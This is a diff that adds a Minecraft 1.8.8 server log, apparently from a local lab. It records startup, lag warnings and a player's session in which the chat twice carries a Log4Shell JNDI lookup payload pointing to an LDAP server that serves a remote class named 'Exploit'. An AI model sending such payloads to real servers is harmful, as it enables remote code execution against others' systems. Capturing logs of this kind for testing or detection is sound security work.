@@ -1,0 +1,33 @@
+[07:21:03] [Server thread/INFO]: Starting minecraft server version 1.8.8
+[07:21:03] [Server thread/INFO]: Loading properties
+[07:21:03] [Server thread/INFO]: Default game type: SURVIVAL
+[07:21:03] [Server thread/INFO]: Generating keypair
+[07:21:06] [Server thread/INFO]: Starting Minecraft server on *:25565
+[07:21:07] [Server thread/INFO]: Using default channel type
+[07:21:08] [Server thread/INFO]: Preparing level "world"
+[07:21:09] [Server thread/INFO]: Preparing start region for level 0
+[07:21:10] [Server thread/INFO]: Preparing spawn area: 4%
+[07:21:11] [Server thread/INFO]: Preparing spawn area: 9%
+[07:21:12] [Server thread/INFO]: Preparing spawn area: 22%
+[07:21:13] [Server thread/INFO]: Preparing spawn area: 47%
+[07:21:14] [Server thread/INFO]: Preparing spawn area: 75%
+[07:21:15] [Server thread/INFO]: Preparing spawn area: 95%
+[07:21:16] [Server thread/INFO]: Done (7.628s)! For help, type "help" or "?"
+[07:21:23] [Server thread/WARN]: Can't keep up! Did the system time change, or is the server overloaded? Running 2358ms behind, skipping 47 tick(s)
+[07:21:42] [Server thread/WARN]: Can't keep up! Did the system time change, or is the server overloaded? Running 4244ms behind, skipping 84 tick(s)
+[07:21:50] [User Authenticator #1/INFO]: UUID of player Holmness is d1921a8b-4a45-45f4-8ad6-569ef7f294aa
+[07:21:50] [Server thread/INFO]: Holmness[/10.0.2.2:52902] logged in with entity id 189 at (-1.6999999880790724, 61.0, -188.69999998807907)
+[07:21:50] [Server thread/INFO]: Holmness joined the game
+[07:21:58] [Server thread/WARN]: Can't keep up! Did the system time change, or is the server overloaded? Running 4147ms behind, skipping 82 tick(s)
+[07:22:35] [Server thread/WARN]: Can't keep up! Did the system time change, or is the server overloaded? Running 15825ms behind, skipping 316 tick(s)
+[07:22:37] [Server thread/WARN]: Can't keep up! Did the system time change, or is the server overloaded? Running 2048ms behind, skipping 40 tick(s)
+[07:29:36] [Server thread/INFO]: <Holmness> ${jndi:ldap://10.0.2.15:1389/Exploit}
+[07:32:26] [Server thread/INFO]: Holmness lost connection: TextComponent{text='Disconnected', siblings=[], style=Style{hasParent=false, color=null, bold=null, italic=null, underlined=null, obfuscated=null, clickEvent=null, hoverEvent=null, insertion=null}}
+[07:32:26] [Server thread/INFO]: Holmness left the game
+[07:33:38] [User Authenticator #2/INFO]: UUID of player Holmness is d1921a8b-4a45-45f4-8ad6-569ef7f294aa
+[07:33:38] [Server thread/INFO]: Holmness[/10.0.2.2:52974] logged in with entity id 9493 at (-1.6999999880790724, 61.0, -188.69999998807907)
+[07:33:38] [Server thread/INFO]: Holmness joined the game
+[07:34:08] [Server thread/INFO]: <Holmness> 2022-05-24
+[07:34:46] [Server thread/INFO]: <Holmness> ${jndi:ldap://10.0.2.15:1389/Exploit}
+[07:41:18] [Server Shutdown Thread/INFO]: Stopping server
+[07:41:18] [Server Shutdown Thread/INFO]: Saving players
